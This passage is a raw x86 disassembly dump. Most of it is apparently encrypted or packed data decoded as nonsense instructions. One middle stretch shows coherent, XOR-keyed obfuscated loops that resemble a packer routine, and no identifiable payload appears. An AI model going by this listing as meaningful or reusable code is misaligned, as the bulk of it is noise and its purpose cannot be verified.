  4058fd:	or     ecx,DWORD PTR [ebp+0x6b]
  405900:	dec    esp
  405901:	imul   ebx,DWORD PTR [edx+0x64],0x74
  405905:	neg    DWORD PTR [ebx]
  405907:	jnp    0xe53ac172
  40590d:	jae    0x4058b3
  40590f:	shl    DWORD PTR [edx],0xa7
  405912:	cmp    BYTE PTR ds:0x800ea120,ah
  405918:	in     al,0x97
  40591a:	mov    eax,ebx
  40591c:	aad    0x26
  40591e:	pop    eax
  40591f:	xchg   ebx,eax
  405920:	in     eax,dx
  405921:	sbb    eax,0xfab69b19
  405926:	inc    edi
  405927:	jb     0x405964
  405929:	mov    ebx,0xbfbe89eb
  40592e:	mov    ah,BYTE PTR [ebp+0x27]
  405931:	in     al,dx
  405932:	int    0x85
  405934:	inc    esp
  405935:	jge    0x4059b4
  405937:	sub    edx,esp
  405939:	stc    
  40593a:	ins    DWORD PTR es:[edi],dx
  40593b:	jne    0x4058ec
  40593d:	mov    al,ds:0x7f0bb9da
  405942:	adc    ch,al
  405944:	idiv   DWORD PTR [edi]
  405946:	xor    dl,bh
  405948:	pop    esp
  405949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40594a:	push   cs
  40594b:	jno    0x40597f
  40594d:	dec    bh
  40594f:	adc    al,0xaf
  405951:	sub    BYTE PTR [ebp-0x63a09ef7],ah
  405957:	loop   0x405934
  405959:	cmp    eax,DWORD PTR [edi]
  40595b:	and    eax,0xa6e97a92
  405960:	xlat   BYTE PTR ds:[ebx]
  405961:	les    esi,FWORD PTR [edi+0x6d6260a5]
  405967:	bound  edx,QWORD PTR [eax]
  405969:	or     BYTE PTR [ecx-0x226e1c55],cl
  40596f:	sub    eax,0x3f2b8468
  405974:	test   eax,0xf76003f3
  405979:	repz xchg esi,eax
  40597b:	mov    eax,ds:0x3a1e77aa
  405980:	jae    0x4059a3
  405982:	xlat   BYTE PTR ds:[ebx]
  405983:	adc    eax,0xe50efc4a
  405988:	inc    ecx
  405989:	fldcw  WORD PTR [esi+0x2928090]
  40598f:	push   esp
  405990:	pushf  
  405991:	and    al,0x91
  405993:	add    DWORD PTR [ebp-0x27],ecx
  405996:	inc    ecx
  405997:	push   eax
  405998:	mov    BYTE PTR [esi-0x71d3c1f9],dl
  40599e:	jmp    0xdbe4e899
  4059a3:	or     BYTE PTR [edi+0x1d0d3caa],al
  4059a9:	xor    al,0xdf
  4059ab:	fst    QWORD PTR [ecx]
  4059ad:	mov    bl,0x22
  4059af:	popa   
  4059b0:	icebp  
  4059b1:	dec    ebp
  4059b2:	ror    BYTE PTR [edx-0x22575a1a],0xf5
  4059b9:	out    0xd9,eax
  4059bb:	(bad)  
  4059bc:	stos   DWORD PTR es:[edi],eax
  4059bd:	cmp    BYTE PTR [edi+0x50],0x5e
  4059c1:	pop    edi
  4059c2:	out    0x52,eax
  4059c4:	lock jbe 0x405a43
  4059c7:	dec    edi
  4059c8:	inc    edi
  4059c9:	test   al,0x52
  4059cb:	xchg   BYTE PTR [esi+0x505bc99f],cl
  4059d1:	jmp    0xe52bd154
  4059d6:	sub    eax,0x1f06eb6c
  4059db:	imul   ecx,esi,0xffffff82
  4059de:	arpl   di,di
  4059e0:	jb     0x4059ea
  4059e2:	and    ch,BYTE PTR [eax-0x9d2fb32]
  4059e8:	mov    al,0x2a
  4059ea:	in     eax,0x68
  4059ec:	in     al,dx
  4059ed:	rcr    edx,cl
  4059ef:	cld    
  4059f0:	loope  0x405a5d
  4059f2:	xchg   ebx,eax
  4059f3:	call   0x5360:0xe2ed33cc
  4059fa:	out    dx,al
  4059fb:	xchg   BYTE PTR [esi-0x309dea24],al
  405a01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a02:	pop    ecx
  405a03:	call   0x1ead1233
  405a08:	pop    es
  405a09:	adc    bl,BYTE PTR [ecx+eax*8-0x61e2366b]
  405a10:	rcr    DWORD PTR [ecx],1
  405a12:	arpl   WORD PTR [edx],di
  405a14:	xchg   esp,eax
  405a15:	push   ds
  405a16:	xor    ebp,0x4f404a8c
  405a1c:	test   BYTE PTR [esi+0x6ce0985d],0xd
  405a23:	mov    dl,0x72
  405a25:	sub    DWORD PTR [edi+ecx*4+0x5806361c],edx
  405a2c:	xor    BYTE PTR [ebx-0x20ca3be2],cl
  405a32:	pop    eax
  405a33:	push   cs
  405a34:	xlat   BYTE PTR ds:[ebx]
  405a35:	xchg   esi,eax
  405a36:	leave  
  405a37:	ds inc esp
  405a39:	les    eax,FWORD PTR [edx]
  405a3b:	adc    dh,al
  405a3d:	xor    esi,DWORD PTR [eax-0xdb5a019]
  405a43:	out    0xad,al
  405a45:	cmp    al,BYTE PTR [ebx+0x5a]
  405a48:	mov    ds:0x55a84013,eax
  405a4d:	mov    eax,ss
  405a4f:	cmc    
  405a50:	into   
  405a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a52:	bound  esi,QWORD PTR [edi+0x9]
  405a55:	inc    ecx
  405a56:	jg     0x405a8d
  405a58:	xor    eax,0x800651df
  405a5d:	xchg   BYTE PTR [eax-0x5d],dl
  405a60:	mov    dh,0xd
  405a62:	mov    eax,0x54bba7e1
  405a67:	cmc    
  405a68:	dec    edi
  405a69:	dec    edi
  405a6a:	add    esp,DWORD PTR [ecx+0x18ca49ea]
  405a70:	loopne 0x405aa9
  405a72:	sub    DWORD PTR [eax],0x55caf093
  405a78:	retf   
  405a79:	inc    ecx
  405a7a:	aad    0x7c
  405a7c:	push   0xc6f59b1c
  405a81:	jns    0x405a79
  405a83:	scas   al,BYTE PTR es:[edi]
  405a84:	test   BYTE PTR [eax+0x39],ch
  405a87:	mov    BYTE PTR [edx-0x8f362f],ch
  405a8d:	dec    ecx
  405a8e:	int3   
  405a8f:	sub    al,0x3a
  405a91:	mov    ds:0x21debbed,al
  405a96:	stos   BYTE PTR es:[edi],al
  405a97:	cmp    DWORD PTR [eax-0x72840595],esi
  405a9d:	pop    edi
  405a9e:	in     al,dx
  405a9f:	fwait
  405aa0:	sub    ah,cl
  405aa2:	jge    0x405acf
  405aa4:	mov    DWORD PTR [ebx-0x5334f51],0x1b38303c
  405aae:	pusha  
  405aaf:	sbb    al,BYTE PTR [ebx]
  405ab1:	aad    0xbe
  405ab3:	int    0xb5
  405ab5:	push   edi
  405ab6:	data16 mov cl,0xc7
  405ab9:	cmp    ebx,ecx
  405abb:	movq   mm3,QWORD PTR [ecx]
  405abe:	xor    esp,DWORD PTR [ebx-0x43f0cf6c]
  405ac4:	jg     0x405a56
  405ac6:	ret    0x6b29
  405ac9:	pusha  
  405aca:	jae    0x405a52
  405acc:	mov    edi,0xbfb31a78
  405ad1:	rcr    edx,1
  405ad3:	in     al,dx
  405ad4:	cmp    edx,eax
  405ad6:	sub    DWORD PTR [ebx-0x3a3bed26],edx
  405adc:	out    dx,al
  405add:	cdq    
  405ade:	or     BYTE PTR [ebx+0x2c40e574],0x49
  405ae5:	pop    edi
  405ae6:	xchg   ebp,eax
  405ae7:	push   edx
  405ae8:	aam    0xec
  405aea:	dec    esi
  405aeb:	push   cs
  405aec:	fcmovne st,st(2)
  405aee:	or     bh,al
  405af0:	xor    edi,DWORD PTR [ebp+0x694b9d81]
  405af6:	sub    ebp,ebx
  405af8:	xchg   BYTE PTR [ebp+0x5548c842],cl
  405afe:	(bad)  
  405aff:	jns    0x405abd
  405b01:	xor    BYTE PTR [edi+edx*1],ah
  405b04:	pop    esp
  405b05:	mov    edx,0x3339d9ea
  405b0a:	test   eax,0xee95a107
  405b0f:	pusha  
  405b10:	jle    0x405b47
  405b12:	sbb    edi,esp
  405b14:	dec    esp
  405b15:	mov    eax,0xebda19a0
  405b1a:	cli    
  405b1b:	mov    cl,0xa6
  405b1d:	cmp    dh,dl
  405b1f:	retf   0xb678
  405b22:	lahf   
  405b23:	ja     0x405b3a
  405b25:	mov    ds:0x4d4d5ff9,al
  405b2a:	lea    esp,[ebx+0x10]
  405b2d:	xor    edi,DWORD PTR [esi+eax*2-0x5b]
  405b31:	xchg   ecx,eax
  405b32:	jg     0x405ba4
  405b34:	fisub  DWORD PTR [ebx-0x3d]
  405b37:	fiadd  DWORD PTR [edx+0x60]
  405b3a:	jno    0x405b67
  405b3c:	movq   mm2,QWORD PTR [esp+eax*1]
  405b40:	in     eax,dx
  405b41:	mov    WORD PTR [ebx],?
  405b43:	jnp    0x405b03
  405b45:	xchg   ebp,eax
  405b46:	fstp   TBYTE PTR [ebx]
  405b48:	lods   eax,DWORD PTR ds:[esi]
  405b49:	fsub   DWORD PTR [eax+0x23]
  405b4c:	dec    ebp
  405b4d:	nop
  405b4e:	add    ecx,edx
  405b50:	adc    edx,DWORD PTR [ebx-0x29]
  405b53:	ror    BYTE PTR [ecx-0x15ba3428],1
  405b59:	jns    0x405aec
  405b5b:	push   ss
  405b5c:	xor    eax,DWORD PTR [ecx+0x37]
  405b5f:	in     al,0xac
  405b61:	push   esp
  405b62:	jecxz  0x405bdc
  405b64:	into   
  405b65:	fisub  WORD PTR [esi+0x32f1f2f8]
  405b6b:	xchg   edi,eax
  405b6c:	push   cs
  405b6d:	xchg   esi,eax
  405b6e:	clc    
  405b6f:	push   ss
  405b70:	sub    dh,BYTE PTR [edi+0x65]
  405b73:	jmp    0x4fc256c6
  405b78:	jo     0x405bae
  405b7a:	retf   0x1b73
  405b7d:	jecxz  0x405b05
  405b7f:	mov    al,bl
  405b81:	jecxz  0x405b40
  405b83:	push   esp
  405b84:	mov    ds:0xa6098439,eax
  405b89:	mov    esi,DWORD PTR [ebp+0xfd0089c]
  405b8f:	xchg   ecx,eax
  405b90:	pushf  
  405b91:	sub    edx,DWORD PTR [esi+eiz*2]
  405b94:	dec    edi
  405b95:	into   
  405b96:	cli    
  405b97:	hlt    
  405b98:	dec    ebp
  405b99:	test   al,0x5e
  405b9b:	(bad)  
  405b9c:	jns    0x405b6c
  405b9e:	mov    cl,0x26
  405ba0:	test   eax,0xd76b851a
  405ba5:	add    DWORD PTR [edi],esp
  405ba7:	cli    
  405ba8:	mov    dh,0xdf
  405baa:	leave  
  405bab:	pop    esi
  405bac:	popa   
  405bad:	(bad)  
  405bae:	push   edx
  405baf:	mov    esp,0xe6c81431
  405bb4:	mov    ecx,0x76e8b752
  405bb9:	jmp    0x405c1f
  405bbb:	sar    BYTE PTR [eax-0x1538b5ba],0xce
  405bc2:	push   ecx
  405bc3:	sub    eax,0x3137280e
  405bc8:	inc    DWORD PTR [edx+ebx*1-0x40e54583]
  405bcf:	sub    bh,al
  405bd1:	retf   0xd83f
  405bd4:	fcmovnb st,st(5)
  405bd6:	cwde   
  405bd7:	dec    ecx
  405bd8:	mov    ebp,0x76db281
  405bdd:	aaa    
  405bde:	dec    ebp
  405bdf:	xor    cl,dh
  405be1:	push   ds
  405be2:	pop    esp
  405be3:	inc    ecx
  405be4:	cmc    
  405be5:	icebp  
  405be6:	xlat   BYTE PTR ds:[ebx]
  405be7:	dec    edi
  405be8:	mov    ah,0xd7
  405bea:	dec    edx
  405beb:	ret    0x66a4
  405bee:	pop    ecx
  405bef:	push   ds
  405bf0:	push   0xa393b971
  405bf5:	loop   0x405ba2
  405bf7:	adc    ch,cl
  405bf9:	in     al,dx
  405bfa:	mov    esp,0xfc10756b
  405bff:	mov    ds:0x6d39d33c,eax
  405c04:	dec    ebx
  405c05:	inc    edx
  405c06:	cmp    al,0x29
  405c08:	in     eax,0x35
  405c0a:	int    0xf7
  405c0c:	dec    eax
  405c0e:	jecxz  0x405c67
  405c10:	mov    al,ds:0x3da501d4
  405c15:	cli    
  405c16:	(bad)
  405c1b:	xor    esp,ebp
  405c1d:	add    al,0x96
  405c1f:	(bad)  
  405c20:	and    al,0x66
  405c22:	push   ax
  405c24:	mov    esp,0xf6352f77
  405c29:	jle    0x405c55
  405c2b:	sub    DWORD PTR [ebp+0x29],edi
  405c2e:	jmp    0x405c85
  405c30:	jo     0x405be1
  405c32:	xor    ebx,esp
  405c34:	outs   dx,DWORD PTR ds:[esi]
  405c35:	mov    edi,0x5d5f28be
  405c3a:	jns    0x405c5b
  405c3c:	dec    esi
  405c3d:	xor    al,0xd9
  405c3f:	retf   
  405c40:	sub    esi,edx
  405c42:	xor    dh,BYTE PTR [ebx-0x2f]
  405c45:	out    0x6b,eax
  405c47:	jo     0x405c0e
  405c49:	mov    ss,WORD PTR [esi+0x65]
  405c4c:	popf   
  405c4d:	adc    ebp,DWORD PTR [eax]
  405c4f:	xchg   edx,eax
  405c50:	adc    dh,dl
  405c52:	jg     0x405c8f
  405c54:	cmp    BYTE PTR [eax-0x4d],al
  405c57:	fbld   TBYTE PTR [ebp-0x6c4b4580]
  405c5d:	push   eax
  405c5e:	push   esi
  405c5f:	or     dl,dl
  405c61:	(bad)  
  405c62:	not    esi
  405c64:	cmp    edi,DWORD PTR [esi-0x2]
  405c67:	adc    al,0xf7
  405c69:	sbb    eax,0xa307c1c4
  405c6e:	xor    DWORD PTR [eax-0x34],esp
  405c71:	adc    eax,0xaf62be78
  405c76:	fldenv cs:[esp+edi*1+0x4593d83e]
  405c7e:	(bad)  
  405c7f:	push   ds
  405c80:	int    0x19
  405c82:	dec    edi
  405c83:	fiadd  WORD PTR [edx]
  405c85:	sti    
  405c86:	call   0xb7aef6b8
  405c8b:	add    al,BYTE PTR [esi-0x12]
  405c8e:	xchg   edx,eax
  405c8f:	push   edx
  405c90:	dec    eax
  405c91:	fdiv   QWORD PTR [esi]
  405c93:	(bad)  
  405c95:	les    edx,FWORD PTR [edx+ebp*8-0x5]
  405c99:	push   ss
  405c9a:	hlt    
  405c9b:	adc    esp,esp
  405c9d:	or     DWORD PTR [ecx],edi
  405c9f:	jb     0x405c36
  405ca1:	cmp    cl,BYTE PTR [edx-0x4d]
  405ca4:	sub    ch,ah
  405ca6:	daa    
  405ca7:	xchg   esi,eax
  405ca8:	or     edx,DWORD PTR [ebx+ecx*1-0x2cf74edb]
  405caf:	xchg   ebp,eax
  405cb0:	push   esi
  405cb1:	scas   al,BYTE PTR es:[edi]
  405cb2:	scas   eax,DWORD PTR es:[edi]
  405cb3:	push   0x9a766cc4
  405cb8:	or     al,0x66
  405cba:	add    al,0x49
  405cbc:	popa   
  405cbd:	jne    0x405c86
  405cbf:	lahf   
  405cc0:	jno    0x405d33
  405cc2:	and    eax,eax
  405cc4:	sub    edx,0x9c3ea56b
  405cca:	cmp    edi,ebp
  405ccc:	jp     0x405c9b
  405cce:	std    
  405ccf:	xchg   ecx,edi
  405cd1:	ror    cl,0x2f
  405cd4:	mov    al,0x10
  405cd6:	cld    
  405cd7:	xor    al,0x7d
  405cd9:	jg     0x405cde
  405cdb:	es cs imul ebx,edi,0xffffffd4
  405ce0:	and    ecx,DWORD PTR [eax+0x3f]
  405ce3:	ds sbb ebx,edx
  405ce6:	stos   BYTE PTR es:[edi],al
  405ce7:	mov    al,ds:0xfe49daab
  405cec:	mov    BYTE PTR ds:0xd2fae594,bh
  405cf2:	out    dx,eax
  405cf3:	cmp    ebp,esi
  405cf5:	sti    
  405cf6:	mov    ebx,edi
  405cf8:	mov    dh,0xcd
  405cfa:	fcomp  QWORD PTR [ebp+0xa]
  405cfd:	mov    edx,0x1744068b
  405d02:	arpl   WORD PTR [ebp-0x63],cx
  405d05:	(bad)  
  405d06:	cmp    cl,BYTE PTR [edi+esi*2+0x23]
  405d0a:	pop    ecx
  405d0b:	adc    al,0x38
  405d0d:	scas   eax,DWORD PTR es:[edi]
  405d0e:	add    DWORD PTR cs:[eax-0x43],esi
  405d12:	adc    edi,eax
  405d14:	je     0x405d04
  405d16:	xchg   ebx,eax
  405d17:	out    0xf7,eax
  405d19:	sbb    ecx,0xffffffb8
  405d1c:	or     BYTE PTR [ecx+0x62],ah
  405d1f:	sar    DWORD PTR [ecx-0x7b],0xcc
  405d23:	and    eax,0x69bfc392
  405d28:	out    dx,al
  405d29:	sub    al,0x28
  405d2b:	sbb    BYTE PTR [eax],cl
  405d2d:	cs pop ebp
  405d2f:	test   BYTE PTR [eax+0x16],ch
  405d32:	push   ecx
  405d33:	lea    esi,[edx]
  405d35:	out    0x76,eax
  405d37:	adc    ebp,edi
  405d39:	adc    eax,0x60b68d0e
  405d3e:	mov    DWORD PTR ds:0x559275c3,esi
  405d44:	stc    
  405d45:	mov    bl,0x6c
  405d47:	xchg   ebx,eax
  405d48:	push   0x6b
  405d4a:	call   0x9e55:0xae202457
  405d51:	push   ss
  405d52:	xor    al,0xdc
  405d54:	jmp    0x405da8
  405d56:	ss pop ebp
  405d58:	push   esi
  405d59:	outs   dx,DWORD PTR ds:[esi]
  405d5a:	in     eax,dx
  405d5b:	inc    eax
  405d5c:	loop   0x405d12
  405d5e:	ins    DWORD PTR es:[edi],dx
  405d5f:	jbe    0x405ddd
  405d61:	push   ebp
  405d62:	inc    ebp
  405d63:	mov    WORD PTR [esi-0x6bbd25c4],ss
  405d69:	cmp    BYTE PTR [edi+0x2d8e28b7],dh
  405d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d70:	push   esp
  405d71:	(bad)  
  405d73:	pop    esp
  405d74:	push   esi
  405d75:	mov    BYTE PTR [ebp-0x36],dh
  405d78:	mov    bh,0x96
  405d7a:	mov    bh,0x9c
  405d7c:	icebp  
  405d7d:	jge    0x405dcc
  405d7f:	out    0xec,al
  405d81:	es ss add eax,0x62c8fe60
  405d88:	push   ds
  405d89:	imul   eax,edi,0x8f10f54
  405d8f:	hlt    
  405d90:	cmp    al,0xb2
  405d92:	popa   
  405d93:	mov    ds:0x58bca516,eax
  405d98:	and    DWORD PTR [ebx-0x5b],0x6af95df8
  405d9f:	aas    
  405da0:	push   ds
  405da1:	stc    
  405da2:	mov    dl,0x5
  405da4:	pop    eax
  405da5:	cld    
  405da6:	test   ecx,ecx
  405da8:	mov    ds:0x9fec06dc,eax
  405dad:	mov    dl,0x68
  405daf:	sbb    ebp,ecx
  405db1:	stos   BYTE PTR es:[edi],al
  405db2:	aas    
  405db3:	pusha  
  405db4:	shl    DWORD PTR [ebx],1
  405db6:	fst    DWORD PTR [esi+0x15]
  405db9:	adc    eax,0x5f65aa3b
  405dbe:	mov    bl,0xf9
  405dc0:	and    eax,0x53e23a98
  405dc5:	call   0xe7f7ad27
  405dca:	fisttp QWORD PTR [esi]
  405dcc:	and    al,0x16
  405dce:	icebp  
  405dcf:	fdiv   DWORD PTR [edi+0x1e]
  405dd2:	nop
  405dd3:	fs out 0x43,eax
  405dd6:	lods   al,BYTE PTR ds:[esi]
  405dd7:	pop    eax
  405dd8:	loope  0x405d5b
  405dda:	jno    0x405e56
  405ddc:	or     ecx,edx
  405dde:	test   al,0xca
  405de0:	or     eax,DWORD PTR [ecx-0x5e]
  405de3:	out    dx,eax
  405de4:	mov    dl,0x84
  405de6:	and    DWORD PTR [ebx-0x71],esi
  405de9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dea:	mov    eax,0x7de1dcc8
  405def:	cs mov edx,0xb5163dca
  405df5:	sbb    eax,0x3fa305e9
  405dfa:	fild   DWORD PTR [ebx]
  405dfc:	dec    edx
  405dfd:	rol    esp,cl
  405dff:	dec    ebx
  405e00:	lea    edx,[edx]
  405e02:	cdq    
  405e03:	scas   eax,DWORD PTR es:[edi]
  405e04:	shl    dl,1
  405e06:	jmp    0x2fd0d248
  405e0b:	jg     0x405e37
  405e0d:	xor    BYTE PTR [eax],al
  405e0f:	int3   
  405e10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e11:	mov    ds:0x7ce533d,eax
  405e16:	push   0xffffff98
  405e18:	pop    ss
  405e19:	jecxz  0x405e35
  405e1b:	gs and eax,0x7c7aac3c
  405e21:	(bad)  
  405e22:	mov    ecx,0xd5e11a1
  405e27:	mov    al,0xe
  405e29:	addr16 pop ss
  405e2b:	jl     0x405e43
  405e2d:	in     eax,0x9b
  405e2f:	jno    0x405e3d
  405e31:	(bad)  
  405e33:	mul    dh
  405e35:	mov    ecx,0xc98b691c
  405e3a:	jno    0x405dd2
  405e3c:	lock test DWORD PTR [eax-0x5a],0xb91bfe2
  405e44:	fistp  QWORD PTR [esi]
  405e46:	push   ds
  405e47:	repnz retf 0x40e8
  405e4b:	int    0x6d
  405e4d:	into   
  405e4e:	dec    eax
  405e4f:	ss cmp bl,ah
  405e52:	aaa    
  405e53:	pusha  
  405e54:	sar    DWORD PTR [ebp+0x34],1
  405e57:	mov    eax,ds:0x6c00d51e
  405e5c:	imul   edi,DWORD PTR [eax],0xffffffe5
  405e5f:	jg     0x405e62
  405e61:	mov    edx,0x7d1682f2
  405e66:	int3   
  405e67:	push   cs
  405e68:	mov    ebp,0x5eb3e4ec
  405e6d:	xor    eax,0xd160eb3b
  405e72:	(bad)  
  405e73:	fst    QWORD PTR [edx+0x56cbc916]
  405e79:	sub    ebp,DWORD PTR [ebx]
  405e7b:	imul   esp,DWORD PTR [ecx+0x29],0x28709488
  405e82:	or     DWORD PTR [eax+0x79e5255d],eax
  405e88:	imul   edi,DWORD PTR [edx+0x2ce57343],0x4e
  405e8f:	mov    DWORD PTR [ebp-0x33],ecx
  405e92:	cmp    ebp,DWORD PTR [edi]
  405e94:	rcl    BYTE PTR [edi+edx*1-0x2fc06ac9],cl
  405e9b:	arpl   WORD PTR [edi-0x21fc72b6],ax
  405ea1:	sub    edi,DWORD PTR [ecx]
  405ea3:	clc    
  405ea4:	mov    edi,0xcd9abee2
  405ea9:	aam    0x47
  405eab:	(bad)  
  405eac:	mov    edx,0xf7437bfc
  405eb1:	cli    
  405eb2:	loope  0x405e93
  405eb4:	cmp    edx,DWORD PTR [ecx-0x5e]
  405eb7:	jb     0x405edd
  405eb9:	jle    0x405ef9
  405ebb:	xor    BYTE PTR [ecx-0x5c052fa],cl
  405ec1:	xchg   ecx,eax
  405ec2:	cwde   
  405ec3:	lock or dl,BYTE PTR [edx]
  405ec6:	push   edx
  405ec7:	imul   edx,DWORD PTR [ebp+0x30489265],0x73cfae38
  405ed1:	pop    ebx
  405ed2:	mov    ch,0xe
  405ed4:	inc    esi
  405ed5:	inc    edx
  405ed6:	sub    eax,0x462fc7df
  405edb:	mov    ebp,0xf39df5e1
  405ee0:	push   edx
  405ee1:	sub    DWORD PTR [edx+0x4619e180],0xffffff9a
  405ee8:	rdmsr  
  405eea:	inc    esi
  405eeb:	aad    0x97
  405eed:	mov    edx,0x6ae4633f
  405ef2:	cmp    ebx,ecx
  405ef4:	pop    es
  405ef5:	fs repz (bad) 
  405ef8:	call   ecx
  405efa:	je     0x405ef4
  405efc:	inc    edi
  405efd:	dec    esp
  405efe:	ror    ecx,cl
  405f00:	adc    al,0xad
  405f02:	adc    BYTE PTR [ebp+eax*8+0x6a],0xc
  405f07:	pop    ss
  405f08:	dec    ebx
  405f09:	mov    ds:0xaa78bc26,eax
  405f0e:	pusha  
  405f0f:	dec    ecx
  405f10:	cmp    al,0xf1
  405f12:	xchg   ebx,eax
  405f13:	mov    al,ds:0x510d715a
  405f18:	mov    bh,0x86
  405f1a:	xor    BYTE PTR [edi+0x637473af],dh
  405f20:	push   esp
  405f21:	mov    ds:0xf41f2216,eax
  405f26:	cmp    BYTE PTR [ecx],cl
  405f28:	and    DWORD PTR [esp+ebx*1-0x3],0x9fe25f21
  405f30:	mov    edx,DWORD PTR [ebp+0x8]
  405f33:	xor    edx,eax
  405f35:	inc    ecx
  405f36:	inc    DWORD PTR [ebp-0x18]
  405f39:	add    edx,esi
  405f3b:	cmp    ecx,edx
  405f3d:	jb     0x403b83
  405f43:	jmp    0x405f8d
  405f48:	mov    ecx,DWORD PTR [ebp-0xc]
  405f4b:	mov    DWORD PTR [ebp+0x8],ecx
  405f4e:	jmp    0x405f80
  405f53:	mov    ecx,DWORD PTR [ebp+0x8]
  405f56:	mov    edx,DWORD PTR [ebp-0x8]
  405f59:	xor    ecx,eax
  405f5b:	xor    edx,eax
  405f5d:	sub    ecx,edx
  405f5f:	sub    ecx,esi
  405f61:	xor    ecx,eax
  405f63:	mov    DWORD PTR [ebp+0x8],ecx
  405f66:	mov    ecx,DWORD PTR [ebp+0x8]
  405f69:	mov    edx,DWORD PTR [ebp+0x8]
  405f6c:	imul   edx,edx,0x5708f5
  405f72:	xor    ecx,eax
  405f74:	add    ecx,esi
  405f76:	lea    ecx,[ebp+ecx*4-0x64]
  405f7a:	mov    edi,DWORD PTR [ecx]
  405f7c:	add    edx,edi
  405f7e:	mov    DWORD PTR [ecx],edx
  405f80:	mov    ecx,DWORD PTR [ebp+0x8]
  405f83:	xor    ecx,eax
  405f85:	add    ecx,esi
  405f87:	jne    0x405f53
  405f8d:	mov    ecx,DWORD PTR [ebp-0xc]
  405f90:	mov    DWORD PTR [ebp+0x8],ecx
  405f93:	jmp    0x405fc5
  405f98:	mov    ecx,DWORD PTR [ebp+0x8]
  405f9b:	mov    edx,DWORD PTR [ebp-0x8]
  405f9e:	xor    ecx,eax
  405fa0:	xor    edx,eax
  405fa2:	sub    ecx,edx
  405fa4:	sub    ecx,esi
  405fa6:	xor    ecx,eax
  405fa8:	mov    DWORD PTR [ebp+0x8],ecx
  405fab:	mov    ecx,DWORD PTR [ebp+0x8]
  405fae:	mov    edx,DWORD PTR [ebp+0x8]
  405fb1:	imul   edx,edx,0x5708f5
  405fb7:	xor    ecx,eax
  405fb9:	add    ecx,esi
  405fbb:	lea    ecx,[ebp+ecx*4-0x64]
  405fbf:	mov    edi,DWORD PTR [ecx]
  405fc1:	add    edx,edi
  405fc3:	mov    DWORD PTR [ecx],edx
  405fc5:	mov    ecx,DWORD PTR [ebp+0x8]
  405fc8:	xor    ecx,eax
  405fca:	add    ecx,esi
  405fcc:	jne    0x405f98
  405fd2:	mov    ecx,DWORD PTR [ebp-0x8]
  405fd5:	mov    edx,DWORD PTR [ebp-0x20]
  405fd8:	xor    ecx,eax
  405fda:	lea    ecx,[ecx+edx*1+0x3272db]
  405fe1:	mov    DWORD PTR [ebp-0x20],ecx
  405fe4:	inc    DWORD PTR [ebp+0xc]
  405fe7:	mov    ecx,DWORD PTR [ebp-0x1c]
  405fea:	xor    ecx,eax
  405fec:	add    ecx,esi
  405fee:	jne    0x401627
  405ff4:	jmp    0x40607d
  405ff9:	mov    ecx,DWORD PTR [ebp-0xc]
  405ffc:	mov    DWORD PTR [ebp+0x8],ecx
  405fff:	jmp    0x406031
  406004:	mov    ecx,DWORD PTR [ebp+0x8]
  406007:	mov    edx,DWORD PTR [ebp-0x8]
  40600a:	xor    ecx,eax
  40600c:	xor    edx,eax
  40600e:	sub    ecx,edx
  406010:	sub    ecx,esi
  406012:	xor    ecx,eax
  406014:	mov    DWORD PTR [ebp+0x8],ecx
  406017:	mov    ecx,DWORD PTR [ebp+0x8]
  40601a:	mov    edx,DWORD PTR [ebp+0x8]
  40601d:	imul   edx,edx,0x5708f5
  406023:	xor    ecx,eax
  406025:	add    ecx,esi
  406027:	lea    ecx,[ebp+ecx*4-0x64]
  40602b:	mov    edi,DWORD PTR [ecx]
  40602d:	add    edx,edi
  40602f:	mov    DWORD PTR [ecx],edx
  406031:	mov    ecx,DWORD PTR [ebp+0x8]
  406034:	xor    ecx,eax
  406036:	add    ecx,esi
  406038:	jne    0x406004
  40603e:	jmp    0x406089
  406043:	mov    ecx,DWORD PTR [ebp+0x8]
  406046:	mov    edx,DWORD PTR [ebp-0x8]
  406049:	xor    ecx,eax
  40604b:	xor    edx,eax
  40604d:	sub    ecx,edx
  40604f:	sub    ecx,esi
  406051:	xor    ecx,eax
  406053:	mov    DWORD PTR [ebp+0x8],ecx
  406056:	mov    ecx,DWORD PTR [ebp+0x8]
  406059:	mov    edx,DWORD PTR [ebp+0x8]
  40605c:	xor    ecx,eax
  40605e:	imul   edx,edx,0x5708f5
  406064:	add    ecx,esi
  406066:	lea    ecx,[ebp+ecx*4-0x64]
  40606a:	mov    edi,DWORD PTR [ecx]
  40606c:	add    edx,edi
  40606e:	mov    DWORD PTR [ecx],edx
  406070:	mov    ecx,DWORD PTR [ebp+0x8]
  406073:	xor    ecx,eax
  406075:	add    ecx,esi
  406077:	jne    0x406043
  40607d:	mov    ecx,DWORD PTR [ebp-0x8]
  406080:	xor    ecx,eax
  406082:	mov    eax,DWORD PTR [ebp+0x10]
  406085:	add    ecx,esi
  406087:	mov    DWORD PTR [eax],ecx
  406089:	pop    edi
  40608a:	jmp    0x40840d
  40608f:	inc    edx
  406090:	push   0x14
  406092:	add    DWORD PTR [ebx+ebp*2+0x53],esp
  406096:	imul   eax,esi,0x79a0f463
  40609c:	cmp    DWORD PTR [ecx+0x623cb636],edx
  4060a2:	bound  ebx,QWORD PTR [edi+ebx*2]
  4060a5:	bound  esp,QWORD PTR [edx+0x47]
  4060a8:	ficomp DWORD PTR [ebx]
  4060aa:	jecxz  0x4060ea
  4060ac:	xchg   esi,eax
  4060ad:	cmp    DWORD PTR es:[ebx-0x4b],eax
  4060b1:	mov    eax,0x20dc8410
  4060b6:	inc    eax
  4060b7:	fs push ebx
  4060b9:	pop    es
  4060ba:	jmp    0x4060d9
  4060bc:	add    eax,0x480162e
  4060c1:	aaa    
  4060c2:	fs mov bh,al
  4060c5:	dec    edi
  4060c6:	pop    eax
  4060c7:	int3   
  4060c8:	push   ds
  4060c9:	fs add eax,0xd1c1d58e
  4060cf:	imul   esi,ebx,0xffffffb7
  4060d2:	and    BYTE PTR [ebp-0x525a77ce],0xf8
  4060d9:	addr16 dec ebp
  4060db:	(bad)  
  4060dc:	aad    0x92
  4060de:	mov    ah,0x66
  4060e0:	cdq    
  4060e1:	call   0x3edc8291
  4060e6:	mov    dl,0x24
  4060e8:	inc    esp
  4060e9:	hlt    
  4060ea:	fnstsw WORD PTR [esi+edi*2-0x2a]
